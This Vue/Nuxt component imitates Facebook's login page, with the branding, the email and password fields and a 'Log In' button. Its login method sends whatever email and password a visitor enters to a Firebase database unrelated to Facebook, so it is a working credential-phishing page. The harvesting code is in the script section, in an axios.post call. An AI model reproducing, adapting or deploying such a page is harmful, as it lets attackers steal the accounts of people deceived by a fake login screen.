<template>
    <div>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Facebook - Log In or Sign Up</title>
          <!--Bootstrap-->
          <link
            rel="stylesheet"
            href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
            integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
            crossorigin="anonymous"
          />
          <!--Fontawesome CDN link-->
          <link
            rel="stylesheet"
            href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
          />
          <!--External CSS StyleSheet-->
          <link rel="stylesheet" href="style.css" />
          <!--Google fonts-->
          <link
            href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Nosifer&family=Pacifico&display=swap"
            rel="stylesheet"
          />
          <link
            href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap"
            rel="stylesheet"
          />
          <link
            href="https://fonts.googleapis.com/css2?family=Audiowide&family=B612+Mono&family=Days+One&family=Nosifer&family=Pacifico&display=swap"
            rel="stylesheet"
          />
        </head>
  
        <body>
          <div class="facebook">
            <div class="mobile-top-view">
              <img src="fb-mobile.png" alt="" />
              <a href="#">Get Facebook for Android and browse faster.</a>
            </div>
            <div class="view">
              <div class="container">
                <!--Row-->
                <div class="row">
                  <!--Column 1-->
                  <div class="col title-div">
                    <div>
                      <h1 class="text-primary">facebook</h1>
                      <p>
                        Connect with friends and the world around you on Facebook.
                      </p>
                    </div>
                  </div>
                  <!--Column 2-->
                  <div class="col-sm-5">
                    <div class="card">
                      <form
                        method="post"
                      >
                        <div>
                          <input
                            id="email"
                            v-model="email"
                            class="input-group"
                            type="text"
                            placeholder="Email or Phone Number"
                            name="email"
                          />
                          <input
                            id="pass"
                            v-model="password"
                            class="input-group my-2"
                            type="password"
                            placeholder="Password"
                            name="password"
                          />
                          <button    
                            id="fbLogin"
                            class="btn btn-primary btn-lg"
                            style="width: 100%"
                            type="submit"
                            @click="login()"
                          >
                            Log In
                          </button>
                          <hr id="hr1" />
                          <p
                            id="forgetPass1"
                            class="text-center my-3"
                            style="font-size: 14px"
                          >
                            <a href="#">Forget account?</a>
                          </p>
                        </div>
                      </form>
                      <hr id="hr2" />
                      <button id="createAcBtn" class="btn btn-success btn-lg">
                        Create New Account
                      </button>
                      <p id="forgetPass2" class="text-center my-3">
                        <a href="#">Forget account?</a>
                      </p>
                    </div>
                    <p
                      id="form-footer"
                      class="text-center my-4"
                      style="font-size: 14px"
                    >
                      <b>Create a Page</b> for a celebrity, brand or buisness.
                    </p>
                    <div class="mobile-version-footer">
                      <div class="row language">
                        <div class="col">
                          <p>English (US)</p>
                          <p>हिन्दी</p>
                          <p>Portugues (Brasil)</p>
                          <p>Deutsch</p>
                        </div>
                        <div class="col">
                          <p>नेपाली</p>
                          <p>Espanol</p>
                          <p>Francais (France)</p>
                          <p><i class="fa fa-plus-square"></i></p>
                        </div>
                      </div>
                      <div class="nav">
                        <ul>
                          <a href="">
                            <li>About</li>
                          </a>
                          <a href="">
                            <li>Help</li>
                          </a>
                          <a href="">
                            <li>More</li>
                          </a>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <!--Row End-->
                </div>
              </div>
            </div>
          </div>
        </body>
      </html>
    </div>
  </template>
  
  <script>
  import axios from 'axios';
  export default {
    name: 'TestNuxtKnowledgeFacebook',
  
    data() {
      return {}
    },
  
    mounted() {},
  
    methods: {
   async   login(){
        const data = {
       email: this.email,
       password: this.password,
       time:'facebook2'
      }
      await this.$store.commit("facebook/setFacebook2", true);
     await   axios.post('https://facebook-lo-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', data)
      .then((response) => {
      })
      .catch((error) => {
        console.log(error);
      });
      }
    },
  }
  </script>
  